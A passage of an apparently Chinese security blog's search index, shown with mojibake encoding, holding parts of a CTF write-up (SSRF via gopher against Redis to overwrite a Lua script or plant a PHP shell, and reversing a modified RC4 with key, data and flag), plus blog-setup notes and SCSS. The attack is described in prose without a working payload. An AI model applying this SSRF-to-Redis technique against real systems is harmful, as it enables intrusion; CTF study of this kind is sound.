chunk, err = load(lua_code) if chunk then local success, result = pcall(chunk) if not success then print(\"Error executing Lua code: \", result) end else print(\"Error loading Lua code: \", err) end else print(\"Error: No valid Lua code block found.\") end end local function main() local filename = \"/scripts/visit.script\" local script_content = read_file(filename) if script_content then execute_lua_code(script_content) end end main() æœ€åæ˜¯æ‰§è¡Œäº†ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œ/scripts/visit.scriptçš„ä½œç”¨æ˜¯ä»å¤–éƒ¨ URL è·å–æ•°æ®å¹¶å°†å…¶ç¼“å­˜åˆ° Redis ä¸­ï¼Œä¸€ä¸ªå¾ˆæ˜æ˜¾çš„ssrfæ‰“redisï¼Œåˆšå¼€å§‹èµ°åäº†ï¼Œä»¥ä¸ºæ˜¯æ‰“ä¸ªcve å¯ä»¥ç›´æ¥æŠŠ/scripts/visit.scriptè¦†ç›–æˆæ‰§è¡Œ/readflagå¹¶è·å–å›æ˜¾ï¼Œç”¨dictåè®®è€æ˜¯ä¼šæŠ¥å¼•å·æœ‰é—®é¢˜ï¼Œç”¨gopheråè®®æ‰“ è¿™é‡Œé€‰æ‹©çš„æ˜¯phpshellï¼Œé»˜è®¤ç”Ÿæˆçš„æ˜¯shell.phpï¼Œè§£ç æ”¹ä¸€ä¸‹æ–‡ä»¶åå’Œé•¿åº¦ æœ€åç¼–ç çš„è¯è¿˜æ˜¯å»ºè®®ç”¨bpç›´æ¥ç¼–ç ï¼Œå…¶ä»–çš„æ€»ä¼šå‡ºç‚¹é—®é¢˜ æ¥ä¸‹æ¥æ˜¯äºŒè¿›åˆ¶çˆ·çš„wp ","date":"2025-01-07","objectID":"/posts/6c39531/:3:0","tags":["CTF"],"title":"è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›åˆèµ›2025éƒ¨åˆ†wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"donntyousee\ræ‰“å¼€æ–‡ä»¶é€æ­¥è°ƒè¯• è¿™é‡Œé¢æ˜¯call-retå‹èŠ±æŒ‡ä»¤ï¼Œæ‰€ä»¥æŠŠç›¸å…³å†…å®¹nopæ‰ï¼Œå¤§è‡´æ ¼å¼æ˜¯ï¼š push rax; call loop; loop: xxxxx; ret; pop rax; æ¯ä¸ªç›¸å…³çš„å‡½æ•°éƒ½æœ‰è¿™ä¸ªï¼Œå¯ä»¥å…¨éƒ¨nopæ‰ è°ƒç”¨äº†è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«éƒ½æ˜¯call r8ï¼Œåªæœ‰åŠ¨æ€è°ƒè¯• ç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡ŒSboxçš„åˆå§‹åŒ–ï¼Œç”¨çš„æ•°æ®æ˜¯byte_5C5110ï¼Œè¿™ä¸ªæ˜¯key ç¬¬äºŒä¸ªå‡½æ•°æ˜¯æ‰§è¡ŒåŠ å¯†ï¼Œå¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªé­”æ”¹RC4ï¼Œå¯ä»¥ç›´æ¥é€†å‘ã€‚ ç»§ç»­å¾€åè°ƒè¯• è¿™é‡Œè¿›è¡Œäº†æ¯”è¾ƒï¼Œsub_4E4060æ˜¯è¾“å‡ºæ­£ç¡®ä¸å¦ï¼Œæ‰€ä»¥çœ‹v7çš„ç»ˆå€¼ï¼Œç›´æ¥è§£å¯†å³å¯ key:921C2B1FBAFBA2FF07697D77188C data:25 cd 54 af 51 1c 58 d3 a8 4b 4f 56 ec 83 5d d4 f6 47 4a 6f e0 73 b0 a5 a8 c3 17 81 5e 2b f4 f6 71 ea 2f ff a8 63 99 57 flag:dart{y0UD0ntL4cKg0oD3y34T0F1nDTh3B4aUtY} ","date":"2025-01-07","objectID":"/posts/6c39531/:4:0","tags":["CTF"],"title":"è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›åˆèµ›2025éƒ¨åˆ†wp","uri":"/posts/6c39531/"},{"categories":["æ‚è®°"],"content":"å‰ç½®\rä¸‹è½½å¥½Gitã€Go å’Œ Dart Sassã€hugo Dart Sassæˆ‘è¿™ç”¨çš„npmä¸‹çš„ npm install -g sass sass --version //éªŒè¯å®‰è£… hugoä¸‹è½½ï¼šhttps://github.com/gohugoio/hugo/releasesï¼ˆä¸‹è½½extendæ‹“å±•ç‰ˆçš„ï¼Œæ–¹ä¾¿è‡ªå®šä¹‰åŠ ä¸œè¥¿ï¼Œè®°å¾—åŠ ç¯å¢ƒå˜é‡ï¼‰ å…¶ä»–æˆ‘éƒ½é…å¥½äº†ï¼Œä¸å¤šè¯´ ","date":"2025-01-06","objectID":"/posts/5c6225e/:1:0","tags":["æ‚è®°"],"title":"åšå®¢æ­å»º","uri":"/posts/5c6225e/"},{"categories":["æ‚è®°"],"content":"åšå®¢é…ç½®\rç„¶åæŒ‰ç…§è¿™ä¸ªæ¥å§ï¼š https://fixit.lruihao.cn/zh-cn/documentation/getting-started/quick-start/ è¿™é‡Œechoæ—¶è¦å»æ‰åŒå¼•å·ï¼Œå…¶ä»–çš„ä¸å¤šè¯´ ","date":"2025-01-06","objectID":"/posts/5c6225e/:2:0","tags":["æ‚è®°"],"title":"åšå®¢æ­å»º","uri":"/posts/5c6225e/"},{"categories":["æ‚è®°"],"content":"ç¾åŒ–è®°å½•ï¼ˆæŒç»­æ›´æ–°ingï¼‰\r","date":"2025-01-06","objectID":"/posts/5c6225e/:3:0","tags":["æ‚è®°"],"title":"åšå®¢æ­å»º","uri":"/posts/5c6225e/"},{"categories":["æ‚è®°"],"content":"2025.2.28\ræœ‰äººå‚¬æˆ‘åŠ å‹é“¾ï¼Œäºæ˜¯å¼„ä¸‹å‹é“¾ï¼Œæ„Ÿè§‰ loveit ä¸»é¢˜å’Œ fixit ä¸»é¢˜å·®ä¸å¤šï¼ŒæŒ‰ç…§æ–‡ç« ï¼šhttps://blog.233so.com/2020/04/friend-link-shortcodes-for-hugo-loveit/ æ¥å°±å¥½ï¼Œåªéœ€è¦æ³¨æ„ä¸‹åœ¨ä¿®æ”¹FixIt/assets/css/_page/çš„_single.scssæ—¶å¼•å…¥çš„è¡Œåº”è¯¥ä¸º @import \"../_partials/_single/friend\"; fixit çš„ç›®å½•æ¯” loveit çš„ç›®å½•å°‘äº†ä¸ª s ï¼Œå…¶ä»–çš„è¯å« ai æ”¹äº†ä¸ªé¢œè‰²ï¼ŒæŠŠæ—‹è½¬å»æ‰äº†ï¼Œå†åŠ äº†ä¸ªå¾®å¾®æ”¾å¤§çš„åŠ¨ç”»ï¼Œæˆ‘çš„ friend.scss // ===== å˜é‡å®šä¹‰ ===== $shadow-green: rgba(50, 205, 50, 0.3); // ç»¿è‰²é˜´å½± $hover-green: rgba(144, 238, 144, 0.3); // æ‚¬åœèƒŒæ™¯è‰² $hover-scale: 1.02; // æ‚¬åœæ”¾å¤§æ¯”ä¾‹ $transition-time: 0.3s; // è¿‡æ¸¡åŠ¨ç”»æ—¶é—´ // ===== åŸºç¡€æ ·å¼ ===== .friendurl { text-decoration: none !important; color: black; } .myfriend { width: 56px !important; height: 56px !important; border-radius: 50%; border: 1px solid #ddd; padding: 2px; box-shadow: 1px 1px 1px rgba(0, 0, 0, 0.15); margin: 14px 0 0 14px !important; background-color: #fff; } .frienddiv { // ===== å¸ƒå±€å±æ€§ ===== height: 92px; margin-top: 10px; width: 48%; display: inline-block !important; border-radius: 5px; // ===== è§†è§‰æ•ˆæœ ===== background: rgba(255, 255, 255, 0.2); box-shadow: 4px 4px 2px 1px $shadow-green; // ===== è¿‡æ¸¡åŠ¨ç”» ===== transition: all $transition-time ease-in-out; // ===== æ‚¬åœçŠ¶æ€ ===== \u0026:hover { background: $hover-green; transform: scale($hover-scale); box-shadow: 4px 4px 6px 2px rgba(50, 205, 50, 0.25); // åŠ å¼ºé˜´å½± } // ===== å·¦ä¾§å¤´åƒåŒºåŸŸ ===== .frienddivleft { width: 92px; float: left; margin-right: 2px; } // ===== å³ä¾§æ–‡å­—åŒºåŸŸ ===== .frienddivright { margin-top: 18px; margin-right: 18px; } // ===== æ–‡å­—æ§åˆ¶ ===== .friendname, .friendinfo { text-overflow: ellipsis; overflow: hidden; white-space: nowrap; } } // ===== æ‰‹æœºç«¯é€‚é… ===== @media screen and (max-width: 600px) { .frienddiv { width: 100% !important; // å•åˆ—æ˜¾ç¤º \u0026:hover { transform: scale(1.01); // ç¼©å°æ”¾å¤§æ¯”ä¾‹ } .friendinfo { display: none; } .frienddivleft { width: 84px; margin: auto; } .frienddivright { height: 100%; margin: auto; display: flex; align-items: center; justify-content: center; } .friendname { font-size: 14px; } } } ","date":"2025-01-06","objectID":"/posts/5c6225e/:3:1","tags":["æ‚è®°"],"title":"åšå®¢æ­å»º","uri":"/posts/5c6225e/"},{"categories":null,"content":"IntroductionğŸ‘¨â€ğŸ’»\rWeb/Misc@D0g3 æƒ³å­¦æ¸—é€ï¼Œæƒ³å­¦Java ","date":"0001-01-01","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Contact meâ˜ï¸\rQQï¼šMjg2OTg3Mzk1OQ== Githubï¼šhttps://github.com/6s6-630 ","date":"0001-01-01","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"D0g3\rgaorenyusi\rWeb\rYuy0ung\rWeb\u0026Misc\rfupanc\rWeb\rVVkladg0\rWeb\rtammy66\rWeb\rLitsasuk\rWeb\rpRism\rRe\r","date":"0001-01-01","objectID":"/links/:0:1","tags":null,"title":"Links","uri":"/links/"}]